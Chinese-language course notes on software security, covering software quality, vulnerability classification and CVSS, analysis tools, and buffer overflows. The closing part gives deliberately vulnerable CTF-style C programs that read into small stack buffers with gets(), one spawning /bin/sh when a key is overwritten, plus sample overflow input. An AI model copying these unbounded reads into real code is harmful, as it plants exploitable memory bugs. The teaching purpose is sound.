- [x] 软件在运行过程中不稳定，出现异常现象、得不到正常结果或者在特殊情况下由于一些原因造成系统崩溃
  - 由于 `异常` 处理不当，软件运行期间遇到突发问题，处理异常之后无法释放资源，导致这些资源被锁定无法使用
  - 由于 `线程` 处理不当，软件运行中得不到正常结果
  - 由于 `网络连接` 处理不当，网络软件运行过程中，内存消耗越来越大，系统越来越慢，最后崩溃
  - 由于编程没有进行优化，程序运行 `消耗资源过大`

- [x] 黑客利用各种方式达到窃取信息、破坏系统的目的
  - 黑客通过一些手段获取数据库中的 **明文密码**
  - 黑客利用软件的 **缓冲区溢出** ，运行敏感的函数
  - 黑客利用软件对 **数据的校验不全面** ，给用户发送虚假信息
  - 黑客对用户进行 **拒绝服务攻击**

##### 软件不安全的原因

- [x] 从 `软件开发者` 的角度
  - 软件生产没有严格遵守 **软件工程流程**
  - 编程人员没有采用科学的 **编程方法**
  - **测试不到位** (不过有时是无法到位)

- [x] 从 `软件工程客观` 角度
  - 软件 **复杂性** 和工程进度的平衡
  - 安全问题的 **不可预见性**
  - 由于软件 **需求的变动**
  - 软件 **组件之间的交互** 的不可预见性

## 软件安全相关概念

### 软件工程

- 软件安全不是孤立的学科，与软件工程关系最密切

- `软件工程` 是一门研究如何使用 **系统化、规范化、数量化** 等工程原则和方法去进行软件的 **开发、运行和维护** 的学科

- 软件工程采用工程的概念、原理、技术和方来开发维护软件 ，**把经过时间考验而证明正确的管理方法和最先进的软件开发技术结合起来** ，应用到软件开发和维护过程中，来解决软件危机问题，生产出 **无故障的、及时交付的、在预算之内的和满足用户需求** 的软件

- $软件工程 \leftrightarrow 工厂流水线$

#### 软件工程的内容

- 和任何工程方法一样，软件工程以 **质量** 为关注焦点，全面质量管理及相关的现代管理理念为软件工程奠定强有力的根基

- `软件工程的三要素`
  - **过程**
  - **方法**
  - **工具**

<p align="center">
  <img src="./img/软件工程的三要素.png"></img>
</p>

- 软件工程的基础是过程层。软件工程 `过程` **是为获得软件产品，在软件工具支持下由软件人员完成的一系列软件工程活动**
  - 过程层将方法和工具结合在一起

- `方法` 层提供了软件开发的各种方法
  - 项目计划与估算方法、需求分析和设计方法、编程、测试方法及运维方法

- `工具` 层为软件工程方法提供了自动的或半自动的软件支撑环境
  - 计算机辅助软件工程(CASE)，UML

#### 软件工程的学科内容

- 软件工程是一门涉及内容广泛的学科(一级学科)，所依据的基础理论极为丰富，包括数学、计算机科学、经济学、工程学、管理学和心理学等其他学科，其研究的内容包括软件开发技术和软件管理技术

<p align="center">
  <img src="./img/软件工程的学科内容.png"></img>
</p>

### 软件危机

- `软件危机` 是指落后的软件生产方式无法满足迅速增长的计算机软件需求，从而导致 **软件开发与维护过程中出现一系列严重问题的现象**

- `1.软件开发进度难以预测`
  - 拖延工期几个月甚至几年的现象并不罕见，这种现象降低了软件开发组织的信誉

- `2.软件开发成本难以控制`
  - 投资一再追加，令人难于置信。往往是实际成本比预算成本高出一个数量级
  - 而为了赶进度和节约成本所采取的一些 **权宜之计又往往损害了软件产品的质量** ，从而不可避免地会引起用户的不满

- `3.用户对产品功能难以满足`
  - 开发人员和用户之间很难沟通、矛盾很难统一。往往是 **软件开发人员不能真正了解用户的需求，而用户又不了解计算机求解问题的模式和能力** ，双方无法用共同熟悉的语言进行交流和描述
  - 在双方互不充分了解的情况下，就仓促上阵设计系统、匆忙着手编写程序，这种"闭门造车"的开发方式必然导致最终的产品不符合用户的实际需要

- `4.软件产品质量无法保证`
  - 系统中的错误难以消除。软件是逻辑产品，质量问题很难以统一的标准度量，因而造成质量控制困难。软件产品并不是没有错误，而是盲目检测 **很难发现错误** ，而隐藏下来的错误往往是造成重大事故的隐患

- `5.软件产品难以维护`
  - 软件产品本质上是开发人员的 **代码化的逻辑思维活动，他人难以替代** 。除非是开发者本人，否则很难及时检测、排除系统故障。为使系统适应新的硬件环境，或根据用户的需要在原系统中增加一些新的功能，又有可能增加系统中的错误

- `6.软件缺少适当的文档资料`
  - 文档资料是软件必不可少的重要组成部分。实际上，软件的文档资料是开发组织和用户的之间权利和义务的合同书，是统管理者、总体设计者向开发人员下达的任务书，是系统维护人员的技术指导手册，是用户的操作说明书
  - 缺乏必要的文档资料或者文档资料不合格，将给软件开发和维护带来许多严重的困难和问题

### 软件保证(Software Assurance)

- `软件保证` 是计划和系统行动集合来确保软件过程和产品符合需求、标准和规程

- 软件保证要达到如下两个 `目标`
  - `可信性` (trustworthiness)，即没有可利用的弱点存在，无论是来自敌意的还是无意的企图
  - `执行可以预见` (predictable execution) ，可证明的信任软件在执行的时候是依照所希望的那样进行工作。这些行为包括：需求分析、测试、验证，以及报告

- 软件保证关系到两个软件属性
  - `质量` (quality) , 即软件保证是 `软件质量保障` 的简短形式
  - `可靠性` (reliability) ,特别是其中最重要的内容--安全(safety)

### 软件质量

- 软件质量，是贯穿软件生存期的一个极为重要的问题，是软件开发过程中所使用的各种开发技术和验证方法的最终体现

- `软件质量` 的定义：满足软件的各项精确定义的 **功能和性能需求** ，遵守文档化的 **开发标准** ，需要相应地给出或设计一些质量特性及其组合。如果这些质量特性及其组合都能在产品中得到满足，则这个软件产品质量就是高的

- 软件质量反映了以下三方面的问题：
  - `软件需求是度量软件质量的基础` ，不符合需求的软件就不具备质量
  - 在各种标准中定义了一些 `开发准则` ，用来指导软件人员用工程化的方法来开发软件。如果不遵守这些开发准则，软件质量就得不到保证
  - 往往会有一些 `隐含的需求` 没有明确地提出来，例如，软件应具备良好的 **可维护性** ，如果软件只满足那些精确定义了的需求而没有满足这些隐含的需求，软件质量也不能保证

#### 软件质量保证

- `软件质量保证` (Software Quality Assurance)
  - 通过对软件产品有计划地进行评审和审计来验证软件是否合乎标准的系统工程

- SQA的活动原则
  - 确保SQA要自始至终有计划地进行
  - 审查软件产品是否遵守适用的标准、规程和要求，并得到客观验证
  - SQA和结果要保证全员参与，沟通顺畅
  - 逐级解决不符合问题

#### 软件质量的属性

- 可靠性(reliability)：产品在 `规定的条件下和规定的时间` 内， `完成规定功能` 的能力
- 软件可靠性(software reliability) ：在规定环节下及时间内，软件 **不引起系统失效** 的概率
- 可维护性(maintainability)：产品在规定的条件下和时间内，按规定的程序和方法进行 **维修、保持或恢复** 到规定的状态的能力
- 可用性(available)：产品在 `任一随机时刻` 需要和开始执行任务时，处于可工作或可使用状态的程度
- $\color{red}{安全性(safety)：将伤害或损坏的风险限制在可接受水平内的能力}$
- 保密性(confidentiality)：避免未经许可泄露信息的能力
- 完整性(integrity)：避免不适当地更改的能力

#### 软件质量的特性

- 软件质量特性反映了软件的本质。讨论一个软件的质量，问题最终要归结到定义软件的质量特性(用软件质量模型来描述)

- 已有软件质量模型的共同特点是把软件质量特性定义成 `分层模型`

- 在这种分层模型中，最基本的叫做 `基本质量特性` ，它可以由一些子质量特性定义和度量。二次特性在必要时又可由它的一些子质量特性定义和度量

- 按照ISO/TC97/SC7/WG3/1985-1-30/N382， `软件质量度量模型` 由三层组成

##### 软件质量度量模型

- `高层` ：软件质量 **需求评价** 准则(SQRC)

- `中层`：软件质量 **设计评价** 准则(SQDC)

- `低层`：软件质量 **设计度量** 准则(SQMC)

- 对高层和中层建立国际标准，低层由使用单位自行制定

- ISO9126质量特性国际标准
  - 质量特性(6个)：功能性、可取性、可维护性、效率、可使用性、可移植性
  - 质量子特性(21个)
  - 度量

<p align="center">
  <img src="./img/软件质量度量模型.png"></img>
</p>

### 软件可靠性

- 1983年，美国IEEE计算机学会给出的软件可靠性的定义:
  - 1) 在规定的 `条件` 下，在规定的 `时间` 内，软件 **不引起系统失效的概率**
    2) 2) 在规定的时间周期内，在所述条件下程序 **执行所要求的功能** 的能力

- `软件可靠性工程` (Software Reliability Engineering)是一门以减少软件系统在运行中不满足用户要求的可能性为目标的应用科学，其研究内容包括:
  - 1) 软件可靠性的 **分析** : 确定指标、设计开发过程、进行预计、分析失效严重性等
  - 2) 软件可靠性的 **测量** : 用失效数据和 **软件可靠性模型** 估计(或测量)软件运行的可靠性
  - 3) 软件可靠性的 **管理** : 利用可靠性测量和其他信息来控制和改进开发过程，并对采购或重用的软件进行管理
  - 4) 软件可靠性开发过程的 **改进** : 确定影响软件可靠性的因素，改进费用效益关系

- `软件可靠性模型` 是指 **为预计或估算软件的可靠性所建立的结构和数学模型** 。建立可靠性模型是为了将复杂系统的可靠性逐级分解为简单系统的可靠性，以便定量预计、分配、估算和评价复杂系统的可靠性

- 一般软件可靠性模型分两大类
  - 可靠性 `结构` 模型： **依据系统结构逻辑关系** ，对系统的可靠性特征及其发展变化规律做出可靠性评价。此模型既可用软件可靠性综合评价，又可用于软件可靠性分解
  - 可靠性 `预计` 模型：用来 **描述软件失效与软件缺陷的关系** ，借助这类模型，可以对软件的可靠性特征作出定量的预计和评价

### 软件容错

- `软件容错性` 是指软件运行时，能对 **非正常因素** 引起的运行错误给出适当处理或信息提示，使软件运行正常结束

- 容错技术包括以下几个主要方面
  - 故障检测技术
  - 故障恢复技术
  - 破坏估计
  - 故障隔离技术
  - 继续服务

### 可信软件

- “ `可信性` ”是在 **正确性、可靠性、安全性、时效性、完整性、可用性、可预测性、生存性及可控性** 等众多概念的基础上发展起来的一个新概念，是客观对象的诸多属性在人民心目中的一个综合反映

- 一般认为，“可信”是指一个实体在实现既定目标的过程中，行为及结果可以预期，它强调目标与实现相符，强调 **行为和结果的可预测性和可控制性**

- `软件的“可信”` 是 **指软件系统的动态行为及其结果总是符合人们的预期，在受到干扰时仍能提供连续的服务** 。这里的“干扰”包括操作错误、环境影响和外部攻击等

### 软件定义安全(Software Defined Security)

- `软件定义安全` 是从 **软件定义网络(Software DefinedNetwork)** 引申而来的

- `SDN` ：把当前IP网络互联节点中决定报文如何转发的 **复杂控制逻辑** 从交换机/路由器等设备中 **分离** 出来，以便通过软件编程实现硬件对数据转发规则的控制，最终达到对流量进行自由操控的目的

- `SDS` ：将物理及虚拟的网络安全设备预期接入模式、部署方式和实现功能进行 **解耦** ，底层抽象为 `安全资源池` 里的资源，顶层统一 **通过软件编程的方式进行智能化、自动化的业务编排和管理** ，以完成相应的安全功能，从而实现一种灵活的安全防护

- SDS可以分解为以下三个方面：
  - `软件定义流量` ：通过软件编程的方式来实现网络流量的 **细粒度定义及转发控制管理** ，通过将目标网络流量转发到安全设备上，实现安全设备的逻辑部署和使用
  - `软件定义资源` ：通过管理中心 **对安全资源进行注册、池化管理、弹性分配** ，在虚拟计算环境下，管理中心还要支持虚拟安全设备模板的分发和设备的创建
  - `软件定义威胁模型` ：对网络流量、网络行为和安全事件等信息进行自动化的采集、分析和挖掘，实现 **对未知的威胁甚至是一些高级安全威胁的实时分析和建模** ，之后用建模结果指导流量定义，实现一种动态、闭环的安全防护

- 软件安全关注的是实现软件产品安全性的全面质量保证的方法，而SDS是实现分布式系统安全可控的一种有效方法

## 软件安全相关工具

### 软件安全工具介绍

- [x] 反汇编器
  - ·IDA Pro· 、W32Dasm

- [x] 反编译器
  - Hex Ray、baksmali

- [x]调试器
  - `GDB` 、 `OllyDBG` 、WinDBG、SoftICE

- [x] 系统监控
  - IceSword(PJF)、 DarkSpy (CardMagic)
  - Process Explorer、Process Monitor(Filemon & Regmon)
  - TCPView、Portmon

- [x] 修补和转储
  - EditPlus、UltraEdit、 Hex Workshop、Dumpbin、PEview

### 软件安全分析基础工具

- [x] 静态分析工具
  - IDA Pro：商业交互式反汇编工具。反汇编、反编译、导入表与导出表解析、函数符号表解析、查找、插件
  - Udis86：开源反汇编库、udcli反汇编工具
  - Capstone：开源、轻量级、多平台、多架构反汇编框架
  - PEiD：Windows平台下常用的PE文件格式分析工具。提取标准可执行文件的文件结构、检测程序加壳
  - 010Editor：商业编辑器，文件编辑、范本分析、脚本分析、磁盘编辑、进程内存编辑

- [x] 动态分析工具
  - Process Monitor：Windows平台下的进程监控工具。进程监控、文件监控、注册表监控、网络监控
  - Wireshark：开源的网络数据包采集和分析软件。流量采集、协议分析
  - GDB：UNIX及UNIX-like平台下的调试工具
  - OllyDbg：Windows平台反汇编动态调试追踪工具，只支持Ring3级别的用户态程序。调试、Trace功能
  - WinDbg：Windows平台动态调试工具。符号功能、调试功能、丰富命令、内核调试
  - `Pin` ： `二进制代码插桩分析框架` 。4种粒度的代码插桩模式：INS级别(指令)、TRACE级别(跳转)、RTN级别(符号表)、IMG级别(监控)；具有良好的用户扩展接口

- [x] 虚拟化辅助分析平台
  - VMWare Workstation：商业的桌面虚拟化软件。虚拟机管理、数据交互、快照、内核调试(结合WinDbg)
  - VirtualBox：免费开源的桌面虚拟化软件
  - QEMU：开源的虚拟化平台，通过自身的指令翻译模块模拟程序的执行
  - Xen：开源虚拟化平台
  - Docker：容器

# 第二章 缓冲区溢出漏洞

- [x] CWE Top 25 Most Dangerous Software Weaknesses http://cwe.mitre.org/top25
- [x] Software Security Learning https://chybeta.github.io/2017/08/19/Software-Security-Learning/
- [x] PWN Learning http://pwnable.kr/play.php(学习笔记：https://etenal.me/archives/972)

## 软件漏洞概述

### 信息安全漏洞

- [x] 关于信息安全漏洞的定义或者解释的角度虽各不相同，但对 <span style="color:red;">漏洞</span> 的认识却有以下 <span style="color:red;">三个共同特点</span> ：
  - 漏洞是信息系统 <span style="color:blue;">自身</span> 具有的 <span style="color:blue;">弱点或者缺陷</span> 
  - 漏洞 <span style="color:blue;">存在环境</span> 通常是 <span style="color:blue;">特定</span> 的
  - 漏洞具有 <span style="color:blue;">可利用性</span> ，若攻击者利用了这些漏洞将会给信息系统安全带来严重威胁和经济损失

### 软件漏洞

- [x] <span style="color:red;">软件(安全)漏洞</span> 是信息系统安全漏洞的一个重要方面

- [x] <span style="color:red;">基本认识</span> ：
  - 软件漏洞通常被认为是软件生命周期中与安全相关的 <span style="color:red;">设计错误</span> 、 <span style="color:red;">编码缺陷</span> 及 <span style="color:red;">运行故障</span> 等
  - 本课程并不对软件漏洞/脆弱点、软件缺陷以及软件错误等概念严格区分
  - 软件漏洞一方面会导致 <span style="color:red;">有害的输出或行为</span> ；另一方面漏洞也会 <span style="color:red;">被攻击者所利用来攻击系统</span> 

- [x] <span style="color:red;">基于软件生命周期的认识</span> ：
  - 软件系统或产品在 <span style="color:blue;">设计、实现、配置、运行</span> 等过程中，由操作实体有意或无意产生的缺陷、瑕疵或错误，它们 <span style="color:blue;">以不同形式存在于信息系统的各个层次和环节之中，且随着信息系统的变化而改变</span> 
  - 漏洞是 <span style="color:red;">贯穿软件生命周期各环节</span> 的。在时间维度上，漏洞都会经历 <span style="color:blue;">产生、发现、公开、消亡</span> 等过程

<p align="center">
  <img src="./img/漏洞生命周期.png"></img>
</p>

<!-- tabs:start -->

#### **<span style="color: red;">0-day漏洞</span>**

- [x] 是指已经被发现(有可能未被公开)但官方还 <span style="color:blue;">没有相关补丁的漏洞</span>

#### **<span style="color: red;">1-day漏洞</span>**

- [x] 是指厂商发布安全补丁之后但 <span style="color:blue;">大部分用户还未打补丁</span> 时的漏洞，此类漏洞依
然具有可利用性

#### **<span style="color: red;">历史漏洞</span>**

- [x] 是指距离补丁发布日期已久且可利用性不高的漏洞。由于各方定义不一样，故用虚线表示

<!-- tabs:end -->

### 软件漏洞的特点

<!-- tabs:start -->

#### **持久性**

- 旧漏洞不断消失，新漏洞不断出现

#### **时效性**

- 超过一定时间，漏洞威胁逐渐减少

#### **广泛性**

- 会影响很大范围的软件和硬件设备

#### **具体性**

- 存在于具体的环境或条件中

#### **可利用性**

- 一旦被攻击者利用就会给信息系统带来威胁和损失
 
#### **隐蔽性**

- 往往需要通过特殊的漏洞分析手段才能发现

<!-- tabs:end -->

### 软件漏洞成因分析

- <span style="color: blue;">计算机系统结构</span> 决定了 <span style="color: red;">漏洞的必然性</span>
- 软件趋向大型化，第三方扩展增多，供应链风险加大
- 新技术、新应用产生之初即缺乏安全性考虑
- 软件使用场景更具威胁
- 软件安全开发重视不够，开发者缺乏安全知识

<p align="center">
  <img src="./img/软件漏洞成因分析.png"></img>
</p>

### 缺陷密度

- [x] 在软件安全性分析中可以使用 <span style="color: red;">缺陷密度</span> ( <span style="color: blue;">即每千行代码中存在的软件缺陷数量</span> )来衡量软件的安全性

- [x] 以下各类软件代码缺陷的统计数据：
  - 普通软件开发公司开发的软件的缺陷密度为4～40个缺陷/KLOC
  - 高水平的软件公司开发的软件的缺陷密度为2～4个缺陷/KLOC
  - 美国NASA的软件缺陷密度为0.1个缺陷/KLOC

> - 注：KLOC-千行代码(thousands of lines of code)

### 软件漏洞为什么要管理

- [x] 《网络安全法》
  - 第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。
  - 第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。

- [x] 案例：白帽黑客(帮助厂商发现漏洞)的罪与罚
  - 2016年乌云网关闭、漏洞盒子“暂停”
  - “白帽”合法性、漏洞公布的合规性

- [x] 案例：阿里巴巴月饼门
  - 阿里巴巴4名工程师在阿里内部的月饼销售过程中，利用系统漏洞多刷了124盒月饼，被开除

- [x] 为什么要对漏洞进行管理？  
  - 漏洞是一种“武器”
  - 让白帽的漏洞发现有章有法
  - 漏洞管控势在必行
    - 漏洞的发现和修复就像一场此起彼伏的战争，永无完结之时
    - 漏洞威胁的不仅仅是个人信息和财产、企业数据和信誉，也关系到国家重要信息系统和基础设施的安全
    - 漏洞的发现和报告机制、漏洞的交易、漏洞的利用都应该有着法律的界限，相应的管理也需要与时俱进
    - 通过建立完善的国家漏洞管理体系，将漏洞资源纳入国家管控机制

#### 漏洞信息平台

<p align="center">
  <img src="./img/漏洞信息平台.png"></img>
</p>

### 软件漏洞分类

<!-- tabs:start -->

#### **基于漏洞成因的分类**

- `内存破坏` 类：越界访问、缓冲区溢出等
- `逻辑错误` 类：涉及安全检查的实现逻辑上存在的问题，导致设计的安全机制被绕过
- `输入验证` 类、 `设计错误` 类、 `配置错误` 类等

#### **基于漏洞利用位置的分类**

- `本地漏洞` 。即 `需要` 操作系统级的 `有效帐号登录到本地` 才能利用的漏洞，主要构成为 `权限提升类` 漏洞，即把自身的执行权限从普通用户级别提升到管理员级别
- `远程漏洞` 。即无需系统级的帐号验证即可 `通过网络` 访问目标进行利用的漏洞

#### **基于威胁类型的分类**

- `获取控制` 。即可以导致劫持程序执行流程， <span style="color: blue;">转向执行攻击者指定的任意指令或命令</span> ，控制应用系统或操作系统。威胁最大，同时影响系统的保密性、完整性，甚至在需要的时候可以影响可用性。主要来源：内存破坏类
- `获取信息` 。即可以导致劫持程序 <span style="color: blue;">访问预期外的资源</span> 并泄露给攻击者，影响系统的保密性。主要来源：输入验证类、配置错误类漏洞
- `拒绝服务`。即可以导致目标应用或系统 <span style="color: blue;">暂时或永远性地失去响应正常服务的能力</span> ，影响系统的可用性。主要来源：内存破坏类、意外处理错误类漏洞

<!-- tabs:end -->

### 软件漏洞分级

- [x] 对漏洞进行分级有助于人们对数目众多的安全漏洞给予不同程度的关注并采取不同级别的措施

<!-- tabs:start -->

#### **按照漏洞严重等级进行分级**

<p align="center">
  <img src="./img/按照漏洞严重等级进行分级.png"></img>
</p>

#### **利用通用漏洞评分系统(CVSS)进行分级**

- [x] 依据对 <span style="color: blue;">3种度量评价标准来对一个已知的安全 <span style="color: red;">漏洞危害程度</span> 进行打分
  - <span style="color: blue;">基础得分(Base Score)</span> ：根据漏洞的固有特征反映漏洞的严重程度，不受时间因素影响，并 <span style="color: blue;">假定在不同部署环境中产生合理的最坏情况</span> 的影响；
  - <span style="color: blue;">时间得分(Temporal Score)</span> ：评价漏洞被利用的 <span style="color: blue;">时间窗</span> 的风险大小，比如官方发布了 <span style="color: blue;">补丁</span> 则会降低评估分数；
  - <span style="color: blue;">环境得分(Environment Score)：需要在 <span style="color: blue;">特定环境</span> 下评估。通常由最终用户根据自己的使用环境给出。

- [x] CVSS指标
  - CVSS 由三个衡量指标组组成： <span style="color: blue;">基础评价</span> 、 <span style="color: blue;">生命周期评价</span> 和 <span style="color: blue;">环境评价</span>

<p align="center">
  <img src="./img/CVSS指标.png"></img>
</p>

<!-- tabs:start -->

##### **基础评价**

- `基础评价` 指标组表示漏洞的固有特征，这些特征在一段时间内和用户环境中保持不变。它由两组指标组成：可利用度评价和影响指标。
  - `可利用度评价` 反映了利用漏洞的难易程度和技术手段。也就是说，它们代表了脆弱的对象的特征，我们将其正式称为 <kbd style="color:green;">脆弱组件</kbd>
  - 影响指标反映了成功利用的直接后果，并代表了遭受影响的事物的后果，我们正式将其称为 <kbd style="color:green;">受影响组件</kbd>
  - 虽然脆弱组件通常是软件应用程序、模块、驱动程序等(或可能是硬件设备)，但受影响组件可能是软件应用程序、硬件设备或网络资源。这种衡量漏洞影响的潜力，而不是脆弱组件，是CVSS v3.0 引入的一个关键功能

##### **生命周期评价**

- `生命周期评价` 衡量指标组反映了漏洞的特征，这些特征可能会随时间而变化，但不会随用户环境而变化。例如 <span style="color: blue;">简单易用的漏洞利用工具包</span> 的存在将提高CVSS分值，而创建 <span style="color: blue;">官方补丁</span> 则会降低该分值

##### **环境衡量**

- `环境衡量` 指标组表示与特定用户环境相关且唯一的漏洞特征。考虑因素包括 <span style="color: blue;">是否存在安全控制</span> ，这些控制可以减轻成功攻击的部分或全部后果，以及脆弱的系统在技术基础架构中的相对重要性

<!-- tabs:end -->

<!-- tabs:end -->

### 软件漏洞管理国际标准

<p align="center">
  <img src="./img/软件漏洞管理国际标准.png"></img>
</p>

### 软件漏洞管理国内标准

- [x] 漏洞分类分级指南
  - 《信息安全技术 网络安全漏洞分类分级指南》(GB/T 30279—2020)

- [x] 漏洞标识与描述规范
  - 《信息安全技术 网络安全漏洞标识与描述规范》(GB/T 28458—2020)

- [x] 漏洞管理规范
  - 《信息安全技术 网络安全漏洞管理规范》(GB/T 30276—2020)

- [x] 网络安全漏洞分类分级指南(GB/T 30279—2020)

## 内存结构与缓冲区溢出

### 几个ctf中的pwn例子

#### 最简单的一个pwn

```c
#include <stdio.h>

int main(int argc, char** argv){
  int modified;
  char buffer[10];
  modified = 0;
  gets(buffer);
  if (modified != 0){
    printf("Congratulations, you pwned it.\n");
  }
  else{
    printf("Please try again.\n");
  }
  return 0;
}
```

> - 假设上述代码文件名为 `pwn1.c` ，则进行编译结果如下：

```term
$ gcc -g -o pwn1 pwn1.c
pwn1.c:17:2: warning: no newline at end of file
/tmp/ccEHWCOv.o(.text+0x1e): In function `main`:
/home/example/pwn1.c:7: warning : the `gets` function is dangerous and should not be used.
```

> - 此时就会有gcc的警告表示gets不安全，那么此时进行两个不同输入

```term
$ ./pwn1
## $ 1111
Please try again.
```

```term
$ ./pwn1
## $ 11111111111111
Congratulations, you pwned it.
Segmentation fault
```

> - 很明显能看出由于 `buffer` 大小程序本意上应该是10，但是程序分配地址空间时，是连续分配的，所以当程序分配好10个大小的 `buffer` 以后，其就会分配 `modified` 变量地址，如果在 `gets` 时一次输入超过十个字符，则后续字符会分配给 `modified` 变量导致其内容更改，此时其值不为0，同时触发段错误([`Segmentation fault`](https://zh.wikipedia.org/wiki/%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5%E9%8C%AF%E8%AA%A4))

#### 另一个pwn(改造自pwnable.kr-bof)


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
  char overflowme[32];
  printf("overflowme");
  gets(overflowme);
  if (key == 0xcafebabe){
    system("/bin/sh");
  }
  else{
    printf("Nah..\n");
  }
}

int main(int argc, char** argv){
  func(0xdeadbeef);
  return 0;
}
```

> - 此处同上(overflowme导致的缓冲区溢出)。

##### 最简单pwn之改造

```c
#include <stdio.h>

int gets_fun(){
  char buffer[10];
  gets(buffer);
  return 0;
}

int main(int argc, char** argv){
  int modified;
  modified = 0;
  gets_fun();
  if (modified != 0){
    printf("Congratulations, you pwned it.\n");
  }
  else{
    printf("Please try again.\n");
  }
  return 0;
}
```

##### 最简单pwn之再改造

```c
#include <stdio.h>

int gets_fun(){
  char buffer[10];
  gets(buffer);
  return 0;
}

int main(int argc, char** argv){
  int modified;
  modified = 0;
  gets_fun();
  modified = 0;
  if (modified != 0){
    printf("Congratulations, you pwned it.\n");
  }
  else{
    printf("Please try again.\n");
  }
  return 0;
}
```

### 缓冲区溢出简介

#### 缓冲区溢出历史

- http://en.wikipedia.org/wiki/Buffer_overflow
- 最早的攻击：1988年UNIX下的Morris worm，利用的是fingerd的缓冲区溢出
- 1996年，Aleph One在第49期Phrack杂志上发表《Smashing The Stack for Fun and Profit》
- 1999年，Matt Conover(16岁)，heap/bss overflow
- 2000年，format string vulnerability
- 2002年，Integer overflow
- 其他的攻击手法(others)
  - 利用ELF文件格式的特性如：覆盖.plt(过程连接表)、.dtor(析构函数指针)、.got(全局偏移表); return-to-libc(返回库函数)等的方式进行攻击

#### 缓冲区溢出攻击的危害

- 缓冲区溢出漏洞大量存在于各种软件中
- 利用缓冲区溢出的攻击，会导致系统崩溃、敏感信息泄漏、获得系统特权等严重后果
- CWE Top 25 Most Dangerous Software Weaknesses
  - http://cwe.mitre.org/top25/index.html

### Linux内存结构

- [x] Linux及其它几乎所有Intel x86系统、Solaris, etc
- [x] 分页式存储管理
- [x] 平面内存结构，4GB或更大逻辑地址空间
- [x] 栈从下往上生长
- [x] C语言不进行边界检查

#### 进程内存布局

<p align="center">
  <img src="./img/进程内存布局.png"></img>
</p>

> - 一般静态存储值都是在栈上分配地址，动态分配的地址都在堆上。
> - 未初始化的数据一般放在BSS段，而数据段一般放初始化的全局变量，比如static变量，其一般在声明时直接赋值。

```c
#include <stdio.h>

int x = 100;
int main(){
  // data stored on stack
  int a = 2;
  float b = 2.5;
  static int y;

  // allocate memory on heap
  int *ptr = (int *)malloc(2 * sizeof(int));

  // values 5 and 6 stored on heap
  ptr[0] = 5;
  ptr[1] = 6;

  // deallocate memory on heap
  free(ptr);

  return 1;
}
```

> - 上述代码所对应的栈结构如下所示。

<p align="center">
  <img src="./img/进程内存布局1.png"></img>
</p>

#### 栈

- <span style="color: red;">栈 是一种 <span style="color: blue;">先进后出(First In Last Out)</span> 的 <span style="color: blue;">数据结构</span> 
  - 就像子弹壳装弹，一粒一粒压进去 span style="color: blue;">入栈</span> )；打出来的时候，最先压进去的最后弹出来( <span style="color: blue;">出栈</span> )
  - 如果进去顺序是123，出来顺序是321

- 相对于广义的栈而言， <span style="color: red;">栈帧</span> 是操作系统为进程中的 <span style="color: blue;">每个函数调用</span> 划分的一个空间，每个栈帧都是一个独立的栈结构，而 <span style="color: red;">系统栈</span> 则是这些函数调用栈帧的集合

- 系统栈由系统自动维护，用于实现高级语言中函数的调用

##### 函数的栈帧

- [x] 当函数被调用时，系统会为这个函数开辟一个新的栈帧，并把它压入栈区中，所以 <span style="color: blue;">正在运行的函数总是在系统栈区的栈顶</span> ( <span style="color: red;">当前栈帧</span> )。当函数返回时，系统会弹出该函数所对应的栈帧空间
- [x] 栈帧的 <span style="color: red;">生长方向是 <span style="color: blue;">从高地址向低地址增长</span> 的
- [x]  <span style="color: red;">ESP</span> ：扩展栈指针(Extended Stack Pointer)寄存器，其存放的指针指向 <span style="color: blue;">当前栈帧的 <span style="color: blue;">栈顶</span> 
- [x]  <span style="color: red;">EBP</span> ：扩展基址指针(Extended Base Pointer)寄存器，其存放的指针指向 <span style="color: blue;">当前栈帧的 <span style="color: blue;">栈底</span> 
- [x] 显然，ESP与EBP之间的空间即为 <span style="color: red;">当前栈帧空间</span> 

<p align="center">
  <img src="./img/函数的栈帧.png"></img>
</p>

<!-- chat:start -->

<!-- title: 小Tips -->

#### **Tips**

如果 <span style="color: blue;">64位系统</span> ，则为 <span style="color: blue;">rsp、rbp</span> 

<!-- chat:end -->

- [x] 一个函数栈帧中主要包含如下信息：
  - 前栈帧的 <span style="color: red;">栈底</span> 位置(即 <span style="color: red;">前栈帧EBP</span> ) ，用于在函数调用结束后恢复主调函数的栈帧(前栈帧的栈顶可计算得到)
  - 该函数的 <span style="color:red;">局部变量</span> 
  - 函数调用的 <span style="color: red;">参数</span> 
  - 函数的 <span style="color: red;">返回地址RET</span> ，用于保存函数调用前指令的位置，以便函数返回时能恢复到调用前的代码区中继续执行指令

<!-- chat:start -->

<!-- title: 理解 -->

#### **Tips**

因为当前函数调用结束后，需要返回到调用该函数的地址(前栈帧)，同样的ESP和EBP也要移到前栈帧，而前栈帧的栈顶是可以计算得到的(当前函数的栈底)，即ESP的移动去向知道，但是EBP无法通过计算知道，因为不知道前栈帧的大小。所以在当前函数栈帧中需要记载前栈帧的EBP位置。

<!-- chat:end -->

##### 系统栈

- [x] 主函数原型：
  - <kbd style="color:green;">int main (int argc, char *argv[ ], char *envp[ ])</kbd>
  - 示例： <kbd style="color:red;">ls -l /usr/include</kbd>

<p align="center">
  <img src="./img/系统栈.png"></img>
</p>

<p align="center">
  <img src="./img/系统栈1.png"></img>
</p>

<!-- chat:start -->

<!-- title: 理解 -->

#### **Tips**

调用 <kbd>main</kbd> 函数以后形成栈帧，其后面分别跟着其参数(<kbd>argc、argv、envp</kbd>)，而后两者其实为指针，指向对应第一个其对应的数组元素的存储地址，同时其对应的第一个数组元素也会指向一个以 <kbd>null</kbd> 结尾的字符串，这个字符串是执行程序的名称或路径，同时其是以 <kbd>null</kbd> 结尾是因为C语言一般字符串结尾以其作为判断。环境变量也是同理。

<!-- chat:end -->

```c
// 程序命名为main.c
#include <stdio.h>

